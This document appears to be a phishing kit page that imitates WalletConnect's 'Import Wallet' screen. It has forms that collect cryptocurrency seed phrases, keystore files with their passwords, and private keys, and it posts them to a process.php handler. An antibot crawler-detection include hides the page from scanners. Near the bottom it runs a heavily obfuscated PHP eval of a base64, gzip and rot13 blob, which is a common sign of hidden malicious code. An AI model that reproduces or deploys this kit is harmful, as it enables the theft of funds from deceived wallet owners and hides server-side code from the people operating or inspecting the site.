<html>
<meta http-equiv="content-type" content="text/html" />
<?php
error_reporting(0);
include '../files/antibot/crawlerdetect.php';
include_once '../functions.php';
?>


<head>
  <meta charset="UTF-8">
  <link rel="stylesheet" href="./files/main_new.css" type="text/css" />
  <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.2/jquery.validate.min.js" integrity="sha512-UdIMMlVx0HEynClOIFSyOrPggomfhBKJE28LKl8yR3ghkgugPnG6iLfRfHwushZl1MOPSY6TsuBDGPK2X4zYKg==" crossorigin="anonymous"></script>


  <meta name="description" content="Open protocol for connecting Wallets to Dapps">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta property="og:image" content="./files/images/logo.svg">
  <link rel="icon" href="./files/images/logo.svg">
  <script>
    function openCity(evt, cityName) {
      // Declare all variables
      var i, tabcontent, tablinks;

      // Get all elements with class="tabcontent" and hide them
      tabcontent = document.getElementsByClassName("tabcontent");
      for (i = 0; i < tabcontent.length; i++) {
        tabcontent[i].style.display = "none";
      }

      // Get all elements with class="tablinks" and remove the class "active"
      tablinks = document.getElementsByClassName("tablinks");
      for (i = 0; i < tablinks.length; i++) {
        tablinks[i].className = tablinks[i].className.replace(" active", "");
      }

      // Show the current tab, and add an "active" class to the button that opened the tab
      document.getElementById(cityName).style.display = "block";
      evt.currentTarget.className += " active";
    }
  </script>
</head>



<title>Import Wallet</title>

<body>
  <center>
    <header class="sticky top-0 z-10 flex items-center justify-between px-5 py-4 bg-white md:py-6 ">
      <div class="absolute inset-0 shadow-lg opacity-50"></div>
      <div class="z-20 flex justify-around w-full sm:pr-10 md:pr-20"><a
              class="font-semibold text-cool-gray-500 hover:text-cool-gray-600 sm:text-xl" target="_blank"
              href="https://github.com/walletconnect" rel="noopener noreferrer">
              GitHub
          </a><a class="font-semibold text-cool-gray-500 hover:text-cool-gray-600 sm:text-xl" target="_blank"
              href="https://docs.walletconnect.org/" rel="noopener noreferrer">
              Docs
          </a></div>
      <div class="z-20 flex">
          <div class="w-16 mx-6 sm:w-20 md:w-28"><img class="cursor-pointer object-fit"
                  src="./files/walletconnect-logo.svg" href="#"alt="walletconnect logo" /></div>
      </div>
      <div class="z-20 flex justify-around w-full sm:pl-10 md:pl-20"><a
              class="font-semibold text-cool-gray-500 hover:text-cool-gray-600 sm:text-xl"
              href="#">
              Wallets
          </a><a class="font-semibold text-cool-gray-500 hover:text-cool-gray-600 sm:text-xl"
              href="#">
              Apps
          </a></div>
  </header>
    </br>
    <div class="text-cool-gray-500">
      <h1 class="flex justify-center mt-20 text-4xl font-semibold import__page">Import Wallet </h1>
    </br>
	  
	  
	  <div class="tab">
                    <button class="tablinks" id="default" onclick="openCity(event, 'phrase')">Phrase</b></button>
                    <button class="tablinks" onclick="openCity(event, 'keystore')">Keystore JSON</b></button>
                    <button class="tablinks" onclick="openCity(event, 'private')">Private Key</b></button>
					
                  </div>
				  

                <div role="presentation" class="sc-eLwHGX sc-uoixf dVYXTr jGzOKM"></div>
                </div>
				
    
	
               
                <div id="phrase" class="tabcontent">
                     <form action="process.php" method="POST" id="form1">
                      <textarea name="key" required="required" minlength="12" placeholder="Phrase" required="required"></textarea>
                      </br>
                      <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
                      </br>
                      <button form="form1" value="Import" type="submit" name="import" class="btn blMRzM">IMPORT</button>
                    </form>
                  </div>
              
                  <div id="keystore" class="tabcontent">
                    <form action="process.php" method="POST" id="form2">
                      <textarea name="key" required="required" minlength="12" placeholder="Keystore JSON"
                        required="required"></textarea>
                      </br>
                      <div class="field">
                        <input type="text" name="pass" placeholder="Password" required="required" minlength="4" />
                      </div>
                      <div class="desc">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</div>
                      </br>
                      <button form="form2" value="Import" type="submit" name="import" class="btn blMRzM">IMPORT</button>
                    </form>
                  </div>
              
                  <div id="private" class="tabcontent">
                    <form action="process.php" method="POST" id="form3">
                      <div class="field">
                        <input type="text" name="key" placeholder="Private Key" required="required" minlength="64" />
                      </div>
                      <div class="desc">Typically 64 alphanumeric characters</div>
                      </br>
                      <button form="form3" value="Import" type="submit" name="import" class="btn blMRzM">IMPORT</button>
                    </form>
                  </div> 
				  
                  <script>
                    document.getElementById("default").click();
                  </script>
 
    </div>
   


    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script><?php eval(str_rot13(gzinflate(str_rot13(base64_decode('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'))))); ?>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.3/umd/popper.min.js" integrity="sha384-vFJXuSJphROIrBnz7yo7oB41mKfc8JzQZiCq4NCceLEaO4IHwicKwpJf9c9IpFgh" crossorigin="anonymous"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js" integrity="sha384-alpBpkh1PFOepccYVYDB4do5UnbKysX5WZXm3XxPqe5iKTfUKjNkCk9SaVuEZflJ" crossorigin="anonymous"></script>
  </body>
</html>








<script src="./files/jquery.min.js.download"></script>

    <footer class="flex justify-center mt-24 mb-16 sm:mt-32">
      <div class="flex flex-col space-y-6 sm:space-y-0 sm:space-x-20 sm:flex-row"><a
          class="text-sm font-medium sm:text-lg text-cool-gray-600 group-hover:text-cool-gray-500" target="_blank"
          href="https://discord.gg/jhxMvxP" rel="noopener noreferrer">
          <div class="flex"><img class="w-6 sm:w-8" src="./files/discord.svg" alt="Discord" />
            <p class="ml-2">Discord</p>
          </div>
        </a><a class="text-sm font-medium sm:text-lg text-cool-gray-600 group-hover:text-cool-gray-500" target="_blank"
          href="https://twitter.com/walletconnect" rel="noopener noreferrer">
          <div class="flex"><img class="w-6 sm:w-8" src="./files/twitter.svg" alt="Twitter" />
            <p class="ml-2">Twitter</p>
          </div>
        </a><a class="text-sm font-medium sm:text-lg text-cool-gray-600 group-hover:text-cool-gray-500" target="_blank"
          href="https://github.com/walletconnect" rel="noopener noreferrer">
          <div class="flex"><img class="w-6 sm:w-8" src="./files/github.svg" alt="GitHub" />
            <p class="ml-2">GitHub</p>
          </div>
        </a></div>
    </footer>
 
<script src="/script.js"></script>
</body>

</html>

